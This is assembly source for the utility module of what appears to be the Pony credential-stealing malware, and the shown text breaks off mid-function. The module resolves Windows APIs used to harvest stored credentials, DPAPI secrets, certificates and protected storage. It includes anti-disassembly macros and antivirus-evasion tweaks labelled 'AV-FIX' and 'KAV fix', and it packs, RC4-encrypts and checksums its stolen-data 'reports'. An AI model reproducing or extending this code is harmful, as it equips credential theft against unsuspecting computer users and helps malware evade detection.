; Common utils

.data
	MEM_LIMIT		equ	1024*1024

	; File header
					db	"YUI" ; MS AV-FIX
	lpBaseHdr		db	"PWDFILE0"
					db	"YUI" ; MS AV-FIX
	lpBasePkdHdr	db	"PKDFILE0"
					db	"YUI" ; MS AV-FIX
	lpBaseCryptHdr	db	"CRYPTED0"
					db	"YUI" ; MS AV-FIX
	cBaseHdrLen		equ	8
	
	; File version
	lpVerHdr		db	"1.0",0,0,0,0,0
	cVerHdrLen		equ	8
	
	; Module header
	lpModuleHdr 		db 	2, 0, "MODU", 1, 1
	cModuleHdrLen 		equ 	8
	
	CRCPoly   		equ     0EDB88320h xor 11111111h ; PK-ZIP polynominal, xored to hide poly
	lpInstalledList		dd	0
	lpInstalledNames	dd	0
	CUninstStr 		db	'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',0
	CUninstValue		db	'UninstallString',0
	CUninstName		db	'DisplayName',0
	szSlash			db	'\',0
	szNULL			dd	0
	lpDupeArray		dd	0

	szExeExt		db	'.exe',0
	
	szAppMainRegPath	db	"Software\WinRAR",0
	szTextOpen		db	"open",0
	dwCurrentUserKey	dd	HKEY_CURRENT_USER

	CKernel32Dll	db	'kernel32.dll',0
					db	'WTSGetActiveConsoleSessionId',0
					db	'ProcessIdToSessionId',0
					db	0

	CNetApi32Dll	db	'netapi32.dll',0
					db	'NetApiBufferFree',0
					db	'NetUserEnum',0
					db	0

	COle32Dll		db	'ole32.dll',0
					db	'StgOpenStorage',0
					db	0
				
	CAdvapi32Dll	db	'advapi32.dll',0
					db	'AllocateAndInitializeSid',0
					db	'CheckTokenMembership',0
					db	'FreeSid',0
					db	'CredEnumerateA',0
					db	'CredFree',0
					db	'CryptGetUserKey',0
					db	'CryptExportKey',0
					db	'CryptDestroyKey',0
					db	'CryptReleaseContext',0
					db	'RevertToSelf',0
					db	'OpenProcessToken',0
					db	'ImpersonateLoggedOnUser',0
					db	'GetTokenInformation',0
					db	'ConvertSidToStringSidA',0
					db	'LogonUserA',0
					db	'LookupPrivilegeValueA',0
					db	'AdjustTokenPrivileges',0
					db	'CreateProcessAsUserA',0
					db	0

	CCryptApi32Dll	db	'crypt32.dll',0
					db	'CryptUnprotectData',0
					db	'CertOpenSystemStoreA',0
					db	'CertEnumCertificatesInStore',0
					db	'CertCloseStore',0
					db	'CryptAcquireCertificatePrivateKey',0
					db	0

	CMsiDll			db	'msi.dll',0
					db	'MsiGetComponentPathA',0
					db	0

	CPStorageLib	db	'pstorec.dll',0
					db	'PStoreCreateInstance',0
					db	0

	CUserenvDll		db	'userenv.dll',0
					db	'CreateEnvironmentBlock',0
					db	'DestroyEnvironmentBlock',0
					db	0
			
	; kernel32.dll
	MyWTSGetActiveConsoleSessionId	dd	0
	MyProcessIdToSessionId			dd	0

	; netapi32.dll
	MyNetApiBufferFree			dd	0
	MyNetUserEnum				dd	0

	; ole32.dll
	MyStgOpenStorage			dd	0

	; advapi32.dll
	MyAllocateAndInitializeSid	dd	0
	MyCheckTokenMembership		dd	0
	MyFreeSid					dd	0
	MyCredEnumerate				dd	0
	MyCredFree					dd	0
	MyCryptGetUserKey			dd	0
	MyCryptExportKey			dd	0
	MyCryptDestroyKey			dd	0
	MyCryptReleaseContext		dd	0
	MyRevertToSelf				dd	0
	MyOpenProcessToken			dd	0
	MyImpersonateLoggedOnUser	dd	0
	MyGetTokenInformation		dd	0
	MyConvertSidToStringSid		dd	0
	MyLogonUser					dd	0
	MyLookupPrivilegeValue		dd	0
	MyAdjustTokenPrivileges		dd	0
	MyCreateProcessAsUser		dd	0
	
	; crypt32.dll
	MyCryptUnprotectData				dd	0
	MyCertOpenSystemStore				dd	0
	MyCertEnumCertificatesInStore		dd	0
	MyCertCloseStore					dd	0
	MyCryptAcquireCertificatePrivateKey	dd	0

	; msi.dll
	MyMsiGetComponentPath		dd	0

	; pstorec.dll
	MyPStoreCreateInstance		dd	0

	; userenv.dll
	MyCreateEnvironmentBlock	dd	0
	MyDestroyEnvironmentBlock	dd	0
		
.data?
	CRCTable		dd      256 dup(?)

.code

CRYPTPROTECT_UI_FORBIDDEN	equ	1

DATA_BLOB struct DWORD
	cbData			dd	? ; Data length
	pbData			dd	? ; Pointer to data		
DATA_BLOB ends

aP_pack                		proto c, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
aP_workmem_size        		proto c, :DWORD
aP_max_packed_size     		proto c, :DWORD
aP_depack_asm          		proto c, :DWORD, :DWORD
aP_depack_asm_fast     		proto c, :DWORD, :DWORD
aP_crc32               		proto c, :DWORD, :DWORD

des_cbc proto stdcall, :DWORD, :DWORD, :DWORD
des3key	proto stdcall, :DWORD, :DWORD

m2m MACRO M1, M2
	push M2
	pop  M1
ENDM

@Next MACRO EntryLoop: REQ
        cld
        xor     eax, eax
        mov	ecx, -1
        repnz scasb
        cmp     byte ptr[edi], al
        jnz     EntryLoop
ENDM

sIID_IStream    textequ <{00000000cH, 00000H, 00000H, \
                         {0C0H, 000H, 000H, 000H, 000H, 000H, 000H, 046H}}>

comethodQProto5 typedef proto :DWORD, :DWORD, :QWORD, :DWORD, :DWORD
comethodQ5      typedef ptr comethodQProto5

comethodQProto4 typedef proto :DWORD, :QWORD, :DWORD, :DWORD
comethodQ4      typedef ptr comethodQProto4

comethodQProto2 typedef proto :DWORD, :QWORD
comethodQ2      typedef ptr comethodQProto2

OFS_BEGIN       equ     0
OFS_CUR         equ     1
OFS_END         equ     2

; IStream Interface
IStream struct DWORD
        ; IUnknown methods
        IStream_QueryInterface  comethod3 ?
        IStream_AddRef          comethod1 ?
        IStream_Release         comethod1 ?
        
        ; ISequentialStream methods
        IStream_Read            comethod4 ?
        IStream_Write           comethod4 ?

        ; IStream methods
        IStream_Seek            comethodQ4 ?
        IStream_SetSize         comethodQ2 ?
        IStream_CopyTo          comethodQ5 ? 
        IStream_Commit          comethod2 ?
        IStream_Revert          comethod1 ?
        IStream_LockRegion      comethod4 ? 
        IStream_UnlockRegion    comethod4 ? 
        IStream_Stat            comethod3 ? 
        IStream_Clone           comethod2 ? 
IStream ends

; IStorage Interface
IStorage struct DWORD
        ; IUnknown methods
        IStorage_QueryInterface	comethod3 ?
        IStorage_AddRef         comethod1 ?
        IStorage_Release        comethod1 ?
        
        ; IStorage methods
        IStorage_CreateStream	comethod6 ?
        IStorage_OpenStream	comethod6 ?
        IStorage_CreateStorage	comethod6 ?
        IStorage_OpenStorage	comethod7 ?
        IStorage_CopyTo		comethod5 ?
        IStorage_MoveElementTo	comethod5 ?
        IStorage_Commit		comethod2 ?
        IStorage_Revert		comethod1 ?
        IStorage_EnumElements	comethod5 ?
        IStorage_DestroyElement	comethod2 ?
        IStorage_RenameElement	comethod3 ?
        IStorage_SetElementTimes	comethod5 ?
        IStorage_SetClass	comethod2 ?
        IStorage_SetStateBits	comethod3 ?
        IStorage_Stat		comethod3 ?
IStorage ends

.code

StreamCreate proc lpOutStream
	AntiDisasmTrick
	invoke  CreateStreamOnHGlobal, NULL, TRUE, lpOutStream
	ret
StreamCreate endp

StreamFree proc stream
	AntiDisasmTrick
	.IF	stream
    	coinvoke stream, IStream, Release
	.ENDIF
	ret
StreamFree endp

StreamSeekOffset proc stream, ofs, origin
	LOCAL   qPos: QWORD

	AntiDisasmTrick

	push    ofs
	pop     dword ptr[qPos]
	mov     dword ptr[qPos+4], 0
	coinvoke stream, IStream, Seek, qPos, origin, NULL
	ret
StreamSeekOffset endp

StreamGetLength proc stream
	LOCAL   qPos: QWORD

	AntiDisasmTrick

	mov     dword ptr[qPos], 0
	mov     dword ptr[qPos+4], 0
	coinvoke stream, IStream, Seek, qPos, OFS_END, addr qPos

	mov     eax, dword ptr[qPos]
	ret
StreamGetLength endp

StreamReadCheck proc stream, data_len
	LOCAL   qPos: QWORD

	AntiDisasmTrick

	mov	dword ptr[qPos], 0
	mov     dword ptr[qPos+4], 0
	coinvoke stream, IStream, Seek, qPos, OFS_CUR, addr qPos
	invoke	StreamGetLength, stream
	push	eax
	coinvoke stream, IStream, Seek, qPos, OFS_BEGIN, NULL
	pop	eax
	mov     edx, dword ptr[qPos]
	add	edx, data_len
	.IF	edx > eax
		sub	eax, eax
		ret
	.ENDIF
	mov	eax, TRUE
	ret
StreamReadCheck endp

StreamRead proc stream, data_out, data_len
	LOCAL	dwReadBytes: DWORD
	
	AntiDisasmTrick

	invoke	StreamReadCheck, stream, data_len
	.IF	!eax
		ret
	.ENDIF
	
	coinvoke stream, IStream, Read, data_out, data_len, addr dwReadBytes
	test	eax, eax
	.IF	SUCCEEDED
		mov	eax, dwReadBytes
		.IF	eax == data_len
			mov	eax, TRUE
		.ELSE
			sub	eax, eax
		.ENDIF
	.ELSE
		sub	eax, eax
	.ENDIF
	
	ret
StreamRead endp

StreamWrite proc uses esi Stream, lpData, cbData
	LOCAL	dwWritten: DWORD

	AntiDisasmTrick

	; Invalid data/stream pointer
	.IF	!lpData || !Stream
		sub	eax, eax
		ret
	.ENDIF

	; Nothing to write
	.IF	!cbData
		mov	eax, TRUE
		ret
	.ENDIF

	mov	esi, lpData

@l:
	mov	dwWritten, 0
	coinvoke Stream, IStream, Write, esi, cbData, addr dwWritten
	test	eax, eax
	.IF	!SUCCEEDED
		sub	eax, eax
		ret
	.ENDIF
	.IF	!dwWritten
		sub	eax, eax
		ret
	.ENDIF
	mov	eax, dwWritten
	add	esi, eax
	sub	cbData, eax
	jnz	@l

	mov	eax, TRUE
	ret
StreamWrite endp

StreamLoadFromFile proc filename, stream
	LOCAL   hFile: DWORD
	LOCAL	dwRead: DWORD
	LOCAL   buf[4096]: BYTE

	AntiDisasmTrick

	invoke  CreateFile, filename, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
	mov     hFile, eax
	inc     eax
	.IF	ZERO?
		ret
	.ENDIF

@@:
	invoke  ReadFile, hFile, addr buf, sizeof buf, addr dwRead, NULL
	.IF	!eax
		invoke  CloseHandle, hFile
		sub	eax, eax
		ret
	.ENDIF
	invoke	StreamWrite, stream, addr buf, dwRead
	cmp     dwRead, 0
	jnz     @B

	invoke  CloseHandle, hFile
	mov     eax, TRUE
	ret
StreamLoadFromFile endp

; Seek stream end
StreamGotoEnd proc stream
	AntiDisasmTrick
	invoke  StreamSeekOffset, stream, 0, OFS_END
	ret
StreamGotoEnd endp

; Seek stream begin (offset=0)
StreamGotoBegin proc stream
	AntiDisasmTrick
	invoke  StreamSeekOffset, stream, 0, OFS_BEGIN
	ret
StreamGotoBegin endp

; Set new stream size
StreamSetSize proc stream, new_size
	LOCAL   qSize: QWORD
        
    AntiDisasmTrick

	push	new_size
	pop     dword ptr[qSize]
	mov     dword ptr[qSize+4], 0

	invoke	StreamSeekOffset, stream, new_size, OFS_BEGIN
	coinvoke stream, IStream, SetSize, qSize
	ret
StreamSetSize endp

; Clear stream contents
StreamClear proc stream
	AntiDisasmTrick
	invoke	StreamSetSize, stream, 0
	ret
StreamClear endp

Stream_SafeReadStream proc stream, lpData, dwLen, lpStatusCode
	; check current stream status
	mov	edx, lpStatusCode
	.IF	!dword ptr[edx]
		; previous error detected, do not continue
		ret
	.ENDIF

	invoke	StreamRead, stream, lpData, dwLen
	; update stream status
	mov	edx, lpStatusCode
	and	dword ptr[edx], eax
	ret
Stream_SafeReadStream endp

Stream_SafeReadDWORD proc stream, lpStatusCode
	LOCAL	dwData: DWORD
	
	invoke	Stream_SafeReadStream, stream, addr dwData, 4, lpStatusCode
	mov	eax, lpStatusCode
	.IF	dword ptr[eax]
		mov	eax, dwData
		bswap	eax
	.ELSE
		sub	eax, eax
	.ENDIF
	ret
Stream_SafeReadDWORD endp

Stream_SafeReadWORD proc stream, lpStatusCode
	LOCAL	dwData: WORD
	
	invoke	Stream_SafeReadStream, stream, addr dwData, 2, lpStatusCode
	mov	eax, lpStatusCode
	.IF	dword ptr[eax]
		movzx	eax, dwData
		xchg	al, ah
	.ELSE
		sub	eax, eax
	.ENDIF
	ret
Stream_SafeReadWORD endp

Stream_SafeReadByte proc stream, lpStatusCode
	LOCAL	dwData: BYTE
	
	invoke	Stream_SafeReadStream, stream, addr dwData, 1, lpStatusCode
	mov	eax, lpStatusCode
	.IF	dword ptr[eax]
		movzx	eax, dwData
	.ELSE
		sub	eax, eax
	.ENDIF
	ret
Stream_SafeReadByte endp

Stream_SafeReadSkip proc stream, dwLen, lpStatusCode
	mov	edx, lpStatusCode
	.IF	!dword ptr[edx]
		; previous error detected, do not continue
		ret
	.ENDIF

	invoke	StreamReadCheck, stream, dwLen
	.IF	!eax
		mov	edx, lpStatusCode
		mov	dword ptr[edx], FALSE
	.ELSE
		invoke	StreamSeekOffset, stream, dwLen, OFS_CUR
	.ENDIF
	ret
Stream_SafeReadSkip endp

; Save data to a file
SafeWrite proc uses esi hFile, lpData, cbData
	LOCAL	dwWritten: DWORD

	mov	esi, lpData

@l:
	invoke	WriteFile, hFile, esi, cbData, addr dwWritten, NULL	
	.IF	!eax || !dwWritten
		sub	eax, eax
		ret
	.ENDIF
	mov	eax, dwWritten
	add	esi, eax
	sub	cbData, eax
	jnz	@l

	mov	eax, TRUE
	ret
SafeWrite endp

IFDEF	SAVE_REPORT
	COMPILE_SAVETOFILE_CODE	equ 1
ELSEIFDEF	ENABLE_LOADER
	COMPILE_SAVETOFILE_CODE	equ 1
ENDIF

IFDEF COMPILE_SAVETOFILE_CODE
; Export stream contents to a file
StreamSaveToFile proc uses ebx stream, filename
        LOCAL   hFile: DWORD
        LOCAL	lpRead: DWORD
        LOCAL   buf[128]: BYTE

        sub	ebx, ebx
        invoke  CreateFile, filename, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_WRITE or FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @sstf_ret

        invoke  StreamGotoBegin, stream

@@:
        mov	lpRead, 0
        coinvoke stream, IStream, Read, addr buf, 128, addr lpRead
        cmp     lpRead, 0
        .IF	ZERO?
        	inc	ebx
        	jmp @close_handle
        .ENDIF
        invoke  SafeWrite, hFile, addr buf, lpRead
        .IF	eax
        	jmp	@B
        .ENDIF

@close_handle:
        invoke  CloseHandle, hFile

@sstf_ret:
		mov	eax, ebx
        ret
StreamSaveToFile endp
ENDIF

StreamCopy proc To, From
        LOCAL   Len: QWORD

        invoke  StreamGetLength, From
        mov     dword ptr[Len], eax
        mov     dword ptr[Len+4], 0
        
        invoke  StreamGotoBegin, From
        coinvoke From, IStream, CopyTo, To, Len, NULL, NULL
        ret
StreamCopy endp

StreamGetPos proc stream
        LOCAL   qPos: QWORD

        mov     dword ptr[qPos], 0
        mov     dword ptr[qPos+4], 0
        coinvoke stream, IStream, Seek, qPos, OFS_CUR, addr qPos

        mov     eax, dword ptr[qPos]
        ret
StreamGetPos endp

StreamWriteBYTE proc Stream, Data
	invoke	StreamWrite, Stream, addr Data, 1
	ret
StreamWriteBYTE endp

StreamWriteDWORD proc Stream, Data
	invoke	StreamWrite, Stream, addr Data, 4
	ret
StreamWriteDWORD endp

StreamWriteData proc Stream, lpData, DataLen
	.IF	lpData && DataLen
		invoke	StreamWrite, Stream, lpData, DataLen
	.ENDIF
	ret
StreamWriteData endp

StreamWriteBinaryString proc Stream, szString, Len
	invoke	StreamWriteDWORD, Stream, Len
	.IF	Len && szString
		invoke	StreamWriteData, Stream, szString, Len
	.ENDIF	
	ret
StreamWriteBinaryString endp

StreamWriteString proc Stream, szString
	.IF	szString
		invoke	lstrlen, szString
	.ELSE
		sub	eax, eax
	.ENDIF
	invoke	StreamWriteBinaryString, Stream, szString, eax
	ret
StreamWriteString endp

; HEADER(8 bytes) | MODULE-SIZE DWORD | ID WORD | VERSION WORD
; return header start offset
StreamWriteModuleHeader proc Stream, ModuleID, Version 
	invoke	StreamGetPos, Stream
	push	eax
	invoke	StreamWriteData, Stream, addr lpModuleHdr, cModuleHdrLen
	invoke	StreamWriteDWORD, Stream, 0 ; reserved for module size
	invoke	StreamWriteData, Stream, addr ModuleID, 2
	invoke	StreamWriteData, Stream, addr Version, 2
	pop	eax
	ret
StreamWriteModuleHeader endp

StreamUpdateModuleLen proc Stream, ModuleOffset
	LOCAL	len: DWORD
	
	; calculate module data length
	invoke	StreamGetLength, Stream
	sub	eax, ModuleOffset
	mov	len, eax
	
	; seek right place for length dword
	add	ModuleOffset, cModuleHdrLen
	invoke	StreamSeekOffset, Stream, ModuleOffset, OFS_BEGIN
	
	; write length	
	invoke	StreamWriteDWORD, Stream, len
	
	; seek stream end
	invoke	StreamGotoEnd, Stream
	
	mov	eax, len
	ret
StreamUpdateModuleLen endp

; forward definition
CRC32Update proto :DWORD, :DWORD, :DWORD 

; Write obfuscated CRC32 checksum at the end of the stream 
StreamWriteCRC32 proc Stream
	LOCAL	mem: DWORD
	LOCAL	len: DWORD
	LOCAL	_crc32: DWORD
	
	mov	_crc32, 0
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax
		invoke	GlobalLock, mem
		.IF	eax
			invoke	CRC32Update, 0, eax, len
			mov	_crc32, eax
			invoke	GlobalUnlock, mem
		.ENDIF
	.ENDIF
	invoke	StreamGotoEnd, Stream
	
	; obfuscate standard crc32 checksum
	mov	eax, _crc32
	bswap	eax
	not	eax
	invoke	StreamWriteDWORD, Stream, eax 
	ret
StreamWriteCRC32 endp

; Validate obfuscated CRC32 checksum at the end of the stream 
StreamCheckCRC32 proc Stream
	LOCAL	mem: DWORD
	LOCAL	len: DWORD
	LOCAL	real_crc32: DWORD
	LOCAL	lpState: DWORD
	
	mov	real_crc32, 0
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax
		.IF	len >= 4
			sub	len, 4
			invoke	GlobalLock, mem
			.IF	eax
				invoke	CRC32Update, 0, eax, len
				bswap eax
				not	eax
				mov	real_crc32, eax
				invoke	GlobalUnlock, mem
			.ENDIF
		.ELSE
			invoke	StreamGotoEnd, Stream
			sub	eax, eax
			ret
		.ENDIF
	.ELSE
		sub	eax, eax
		ret
	.ENDIF
	
	invoke	StreamSeekOffset, Stream, -4, OFS_END
	mov	lpState, TRUE
	invoke	Stream_SafeReadDWORD, Stream, addr lpState
	.IF	lpState
		bswap	eax
		.IF	eax == real_crc32
			mov	eax, TRUE
		.ELSE
			sub	eax, eax
		.ENDIF
	.ELSE
		; Cannot read stored CRC32 checksum
		sub	eax, eax
	.ENDIF
	ret
StreamCheckCRC32 endp

MD5Hash proto :DWORD, :DWORD, :DWORD
StreamMD5 proc Stream, outHash
	LOCAL	mem: DWORD
	LOCAL	len: DWORD
	
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax
		invoke	GlobalLock, mem
		.IF	eax
			invoke	MD5Hash, eax, len, outHash
			invoke	GlobalUnlock, mem
		.ENDIF
	.ENDIF
	invoke	StreamGotoEnd, Stream
	ret
StreamMD5 endp

MemAlloc proto :DWORD
MemFree proto :DWORD

IFNDEF DISABLE_GRABBER
IFDEF PACK_REPORT
; Pack stream using aplib LZ algorithm
StreamPack proc uses ebx Stream
	LOCAL	mem: DWORD
	LOCAL	packed_len: DWORD
	LOCAL	len: DWORD
	LOCAL	memptr: DWORD
	LOCAL	work_mem: DWORD
	LOCAL	packed: DWORD
	
	sub	ebx, ebx
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax
		invoke	GlobalLock, mem
		.IF	eax
			mov	memptr, eax
			
			invoke	aP_workmem_size, len
			add	eax, 1024*1024*5
			invoke	MemAlloc, eax
			mov	work_mem, eax
			
			invoke	aP_max_packed_size, len
			add	eax, 1024*1024
			invoke	MemAlloc, eax
			mov	packed, eax
			
			invoke	aP_pack, memptr, packed, len, work_mem, NULL
			mov	packed_len, eax
			
			invoke	GlobalUnlock, mem
			
			invoke	StreamClear, Stream
			invoke	StreamWriteData, Stream, offset lpBasePkdHdr, cBaseHdrLen
			or	ebx, eax
			invoke	StreamWriteDWORD, Stream, len
			and	ebx, eax
			invoke	StreamWriteBinaryString, Stream, packed, packed_len
			and	ebx, eax
			
			invoke	MemFree, work_mem
			invoke	MemFree, packed
		.ENDIF
	.ENDIF
	invoke	StreamGotoEnd, Stream
	mov	eax, ebx
	ret
StreamPack endp
ENDIF

ENDIF

; Common memory releasing function
MemFree proc lpMem
	.IF	lpMem
		invoke	LocalFree, lpMem
	.ENDIF
	sub	eax, eax
	ret
MemFree endp
 
; Common memory allocation function
MemAlloc proc dwSize
	mov	eax, dwSize
	add	eax, 128 ; bound safe
	invoke	LocalAlloc, LPTR, eax
	ret
MemAlloc endp

ZeroMemory proc uses edi lpMem, Len 
	cld
	mov     edi, lpMem
	mov     ecx, Len
	jecxz	@F
	push	ecx
	shr     ecx, 2
	sub	eax, eax
	rep stosd
	pop	ecx
	and     ecx, 3
	rep stosb
@@:
	ret
ZeroMemory endp

MoveMem proc uses esi edi lpSrc, lpDst, Len
	mov	edi, lpDst
	cld
	mov	esi, lpSrc
	mov	ecx, Len
	jecxz	@F
	rep movsb
@@:
	ret
MoveMem endp

CompareMem proc uses esi edi lpSrc, lpDst, Len
	mov	esi, lpSrc
	cld	
	mov	ecx, Len
	sub	eax, eax
	mov	edi, lpDst
	jecxz	@F	
	repz cmpsb
@@:
	.IF	!ecx
		inc	eax
	.ENDIF
	ret
CompareMem endp

rc4_state struct 
    x   BYTE   ?
    y   BYTE   ?
    m   BYTE   256 dup(?)
rc4_state ends

; Reset RC4 state, initialize encryption key
RC4Setup proc uses esi edi ebx state, key, len
	LOCAL   a: BYTE
	LOCAL   j: BYTE
	
	invoke  ZeroMemory, state, sizeof rc4_state
	mov     edi, state
	inc     edi
	inc     edi             ; m
	
	sub	edx, edx
	mov     ecx, 256
@l:
	mov     byte ptr[edi+edx], dl
	inc     dl
	loop    @l
	
	mov     edi, state
	inc     edi
	inc     edi             ; m
	mov     esi, key
	
	mov     j, 0
	sub	ecx, ecx        ; k
	sub	ebx, ebx        ; i

@l_gen:
	mov     al, byte ptr[edi+ebx]
	mov     a, al
	
	add     j, al
	mov     al, byte ptr[esi+ecx]
	add     j, al
	
	movzx   edx, j
	mov     al, byte ptr[edi+edx]
	mov     byte ptr[edi+ebx], al
	mov     al, a
	mov     byte ptr[edi+edx], al
	
	inc     ecx
	.IF     ecx >= len
		sub	ecx, ecx
	.ENDIF
	inc     bl
	jnz     @l_gen
	ret
RC4Setup endp

; Crypt data using RC4 algorithm & update the state
RC4Crypt proc uses ebx esi edi state, cdata, len
	LOCAL   a: BYTE
	LOCAL   b: BYTE
	LOCAL   x: BYTE
	LOCAL   y: BYTE
	LOCAL   i: DWORD
	
	m2m	ebx, state ; KAV fix
	assume  ebx: ptr rc4_state
	mov     al, [ebx].x
	mov     x, al
	mov     al, [ebx].y
	mov     y, al
	mov     edi, ebx
	inc     edi
	inc     edi
	
	mov     esi, cdata
	
	mov     i, 0
	
	mov     ecx, len
	jecxz   @no_data

@l:
	; x = (unsigned char) ( x + 1 ); a = m[x];
	inc     x
	movzx   eax, x
	movzx   edx, byte ptr[edi+eax]   ; a
	mov     a, dl
	
	; y = (unsigned char) ( y + a );
	add     y, dl
	
	; m[x] = b = m[y];
	movzx   eax, y
	mov     dl, byte ptr[edi+eax]
	mov     b, dl
	movzx   eax, x
	mov     byte ptr[edi+eax], dl
	
	; m[y] = a;
	movzx   eax, y
	mov     dl, a
	mov     byte ptr[edi+eax], dl
	
	; data[i] ^= m[(unsigned char) ( a + b )];
	mov     dl, a
	add     dl, b
	mov     dl, byte ptr[edi+edx]
	mov     eax, i
	xor     byte ptr[esi+eax], dl
	
	inc     i
	loop    @l

@no_data:
	mov     al, x
	mov     byte ptr[ebx], al
	mov     al, y
	mov     byte ptr[ebx+1], al
	ret
RC4Crypt endp

IFDEF ENCRYPT_REPORT

; Encrypt stream data using rc4 algorithm
StreamEncrypt proc uses ebx Stream, szPassword
	LOCAL	mem: DWORD
	LOCAL	crypted: DWORD
	LOCAL	len: DWORD
	LOCAL	memptr: DWORD
	LOCAL	state: rc4_state
	
	sub	ebx, ebx
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax
		invoke	GlobalLock, mem
		.IF	eax
			mov	memptr, eax
			
			invoke	MemAlloc, len
			mov	crypted, eax
			invoke	MoveMem, memptr, crypted, len
			invoke	GlobalUnlock, mem
			
			; Init RC4 key 
			invoke	lstrlen, szPassword
			invoke	RC4Setup, addr state, szPassword, eax
			
			; Encrypt data
			invoke	RC4Crypt, addr state, crypted, len
			
			invoke	StreamClear, Stream
			invoke	StreamWriteData, Stream, offset lpBaseCryptHdr, cBaseHdrLen
			or	ebx, eax
			invoke	StreamWriteData, Stream, crypted, len
			and	ebx, eax
			invoke	MemFree, crypted
		.ENDIF
	.ENDIF
	invoke	StreamGotoEnd, Stream
	mov	eax, ebx
	ret
StreamEncrypt endp

ENDIF

IFNDEF DISABLE_GRABBER

; Random stream encrypt data using rc4 algorithm
StreamRandEncrypt proc uses ebx Stream
	LOCAL	mem: DWORD
	LOCAL	crypted: DWORD
	LOCAL	len: DWORD
	LOCAL	memptr: DWORD
	LOCAL	state: rc4_state
	LOCAL	rand_data: DWORD

	; Acquire some rand data
	invoke	GetTickCount
	rol	eax, 11
	not	eax
	mov	rand_data, eax
	
	sub	ebx, ebx
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax
		invoke	GlobalLock, mem
		.IF	eax
			mov	memptr, eax
			
			invoke	MemAlloc, len
			mov	crypted, eax
			invoke	MoveMem, memptr, crypted, len
			invoke	GlobalUnlock, mem
			
			; Init RC4 key 
			invoke	RC4Setup, addr state, addr rand_data, 4
			
			; Encrypt data
			invoke	RC4Crypt, addr state, crypted, len
			
			; Write key and encrypted data into source stream
			invoke	StreamClear, Stream
			invoke	StreamWriteData, Stream, addr rand_data, 4
			or	ebx, eax
			invoke	StreamWriteData, Stream, crypted, len
			and	ebx, eax
			invoke	MemFree, crypted
		.ENDIF
	.ENDIF
	invoke	StreamGotoEnd, Stream
	mov	eax, ebx
	ret
StreamRandEncrypt endp

; Random stream decrypt data using rc4 algorithm
StreamRandDecrypt proc uses ebx Stream
	LOCAL	mem: DWORD
	LOCAL	crypted: DWORD
	LOCAL	len: DWORD
	LOCAL	memptr: DWORD
	LOCAL	state: rc4_state
	LOCAL	crypted_ptr: DWORD
	
	sub	ebx, ebx
	invoke	GetHGlobalFromStream, Stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, Stream
		mov	len, eax

		.IF	len >= 4
			invoke	GlobalLock, mem
			.IF	eax
				mov	memptr, eax
				
				invoke	MemAlloc, len
				mov	crypted, eax
				invoke	MoveMem, memptr, crypted, len
				invoke	GlobalUnlock, mem
			
				; Init RC4 key 
				invoke	RC4Setup, addr state, crypted, sizeof DWORD
				
				; Decrypt data
				mov	eax, crypted
				add	eax, 4
				mov	crypted_ptr, eax
				sub	len, 4
				invoke	RC4Crypt, addr state, crypted_ptr, len
				
				; Write key and decrypted data into source stream
				invoke	StreamClear, Stream
				invoke	StreamWriteData, Stream, crypted_ptr, len
				mov	ebx, eax
				invoke	MemFree, crypted
			.ENDIF
		.ENDIF
	.ENDIF
	invoke	StreamGotoEnd, Stream
	mov	eax, ebx
	ret
StreamRandDecrypt endp

ENDIF

PONY_KEY_WOW64_64KEY equ 0100h
PONY_KEY_WOW64_32KEY equ 0200h

RegReadValueEx proc uses edi Key, Path, Param, ResLen, x64
	LOCAL	hkHandle: HKEY
	LOCAL	dataLen: DWORD
	LOCAL	lpType: DWORD
	
	mov	eax, ResLen
	.IF	eax
		mov	dword ptr[eax], 0
	.ENDIF
	
	sub	edi, edi
	.IF	x64 == 1
		mov	edx, PONY_KEY_WOW64_32KEY
	.ELSEIF x64 == 2
		mov	edx, PONY_KEY_WOW64_64KEY
	.ELSE
		sub	edx, edx
	.ENDIF
	
	or	edx, KEY_READ
	
	invoke	RegOpenKeyEx, Key, Path, 0, edx, addr hkHandle
	.IF	eax == ERROR_SUCCESS
		invoke	RegQueryValueEx, hkHandle, Param, NULL, addr lpType, NULL, addr dataLen
		.IF	!eax && dataLen && !(lpType == REG_SZ && dataLen == 1) ; do not return empty values and strings
			mov	eax, dataLen
			inc	eax ; make sure data is always zero-terminated
			invoke	MemAlloc, eax
			mov	edi, eax
			invoke	RegQueryValueEx, hkHandle, Param, NULL, NULL, edi, addr dataLen
			.IF	eax
				; can't read data
				invoke	MemFree, edi
				sub	edi, edi
			.ELSE
				mov	eax, ResLen
				.IF	eax
					push	dataLen
					pop	dword ptr[eax]
				.ENDIF
			.ENDIF
		.ENDIF
		invoke	RegCloseKey, hkHandle
	.ENDIF
	
	mov	eax, edi	
	.IF	!eax && x64 < 2
		; if read failed, then try to read value in x64 mode
		mov	eax, x64
		inc	eax
		invoke	RegReadValueEx, Key, Path, Param, ResLen, eax
	.ENDIF
	ret
RegReadValueEx endp

RegReadValueStr proc Key, Path, Param, ResLen
	.IF	Key == HKEY_CURRENT_USER
		m2m	Key, dwCurrentUserKey
	.ENDIF
	invoke	RegReadValueEx, Key, Path, Param, ResLen, 0
	ret
RegReadValueStr endp

CRC32BuildTable proc
	sub     eax, eax
@a_gen:
	mov     edx, eax
	shl     edx, 1

	mov	ecx, 9
@l:
	shr     edx, 1
	jnc     @no_xor
